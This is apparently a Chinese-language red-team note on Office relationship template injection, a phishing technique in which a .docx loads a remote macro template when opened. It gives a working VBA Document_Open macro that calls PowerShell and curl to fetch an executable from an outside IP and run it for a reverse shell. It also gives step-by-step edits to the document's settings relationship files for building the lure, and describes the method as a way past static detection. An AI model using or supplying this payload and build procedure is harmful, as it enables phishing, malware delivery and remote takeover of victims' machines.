# Office关系模板注入

> [干货 | Office文档钓鱼的实战和免杀技巧-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1917641)
>
> [wps和office宏钓鱼从认识到免杀 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/317116.html)

利用Word文档加载附加模板时的缺陷所发起的恶意请求，而达到的攻击目的，当目标用户点开攻击者发送的恶意Word文档就可以通过向远程服务器发送恶意请求的方式，然后加载模板执行恶意模板的宏。

发送的文档本身不带恶意代码，所以能过很多静态检测。只需要在远程DOTM文档中编写宏病毒或者木马即可。

制作一个宏钓鱼的文档挂载到 HTTP 服务器上, 例如前面的 VBA 宏调 Powershell 下载与执行文件达成反弹shell

```vb
Private Sub Document_Open()

Call Shell(Environ$("COMSPEC") & " /c powershell.exe curl http://100.1.1.131:8000/download/msedge.exe -o msedge.exe && msedge.exe", vbNormalFocus)

End Sub

```

选定目标 word 文档后将其后缀名改成 `.zip` 并解压

![image-20240611053738672](http://cdn.ayusummer233.top/DailyNotes/202406110609857.png)

整体目录结构如下:

![image-20240611053804070](http://cdn.ayusummer233.top/DailyNotes/202406110609303.png)

制作关系模板注入文档主要需要修改两个文件

- `\word\_rels\settings.xml.rels`

  一般 `word/_rels` 文档里可能只有 `document.xml.rels` 没有  `settings.xml.rels`, 此时需要新建一个 `settings.xml.rels` 文档

  ![image-20240611054035175](http://cdn.ayusummer233.top/DailyNotes/202406110609832.png)

  几个关键点

  - `Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"`

    最后一定要是 `attachedTemplate` 定义关系模板

  - `TargetMode` 要是 `External` 外部模板定义

- `\word\settings.xml`

  在 `w:settings` 属性中定义外部模板

  ![image-20240611054105685](http://cdn.ayusummer233.top/DailyNotes/202406110609115.png)

将目录重新打包成 zip 并重命名为 docx 文档

![image-20240611055158981](http://cdn.ayusummer233.top/DailyNotes/202406110609548.png)

打开该文档便会下载外部模板文档并执行宏代码达成反弹shell:

![image-20240611060918908](http://cdn.ayusummer233.top/DailyNotes/202406110609052.png)

![image-20240611060910931](http://cdn.ayusummer233.top/DailyNotes/202406110609182.png)

---

火绒与卡巴可检出:

![image-20240611060428157](http://cdn.ayusummer233.top/DailyNotes/202406110604551.png)

![image-20240611060545677](http://cdn.ayusummer233.top/DailyNotes/202406110605684.png)

![image-20240611060658265](http://cdn.ayusummer233.top/DailyNotes/202406110609640.png)
